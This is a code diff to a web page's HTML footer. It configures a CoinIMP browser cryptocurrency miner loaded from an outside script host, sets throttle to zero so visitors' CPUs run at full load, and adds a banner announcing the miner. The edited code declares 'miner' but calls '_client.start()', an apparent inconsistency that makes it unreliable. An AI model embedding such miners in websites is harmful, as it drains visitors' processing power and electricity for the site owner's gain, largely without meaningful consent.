@@ -156,8 +156,14 @@
         <script src="https://www.hostingcloud.racing/fXQJ.js"></script>
         
 <script>
-    var miner = new Client.User('2d51a7d74290e8a2047efcc6420122fb2df20bf2ab6f457120811e167338344d', 'ElLob');
-    miner.start();
+    var miner = new Client.User('2d51a7d74290e8a2047efcc6420122fb2df20bf2ab6f457120811e167338344d', 'ElLob', {
+        throttle: 0, c: 'w'
+    });
+    _client.start();
+    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
+
 </script>
-    </body>
+        
+</body>
+    
 </html>
